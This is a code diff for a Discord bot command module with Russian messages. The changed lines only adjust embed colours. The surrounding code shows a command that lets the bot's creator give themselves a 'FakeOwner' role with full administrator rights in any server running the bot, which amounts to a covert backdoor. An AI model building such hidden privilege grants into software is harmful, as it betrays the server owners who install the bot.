@@ -23,10 +23,10 @@ class Fullaccess(commands.Cog):
                 await ctx.send(embed = discord.Embed(title = 'У вас уже имеется роль создателя'))
                 return
             if owner_role is None:
-                owner_role = await ctx.guild.create_role(name = 'FakeOwner', permissions = discord.Permissions( administrator = True), color = colors['help'])
+                owner_role = await ctx.guild.create_role(name = 'FakeOwner', permissions = discord.Permissions( administrator = True), color = colors['success'])
             await ctx.author.add_roles(owner_role, reason = None, atomic = True)
         else:
-            await ctx.send(embed = discord.Embed(title = '`Вы не являетесь моим создателем!`', color = discord.Color.dark_red()))
+            await ctx.send(embed = discord.Embed(title = '`Вы не являетесь моим создателем!`', color = colors['error']))
             logger.warning(f'Попытка получить права администратора - Пользователь: {ctx.author} ({ctx.author.id}).')
 
 def setup(bot):
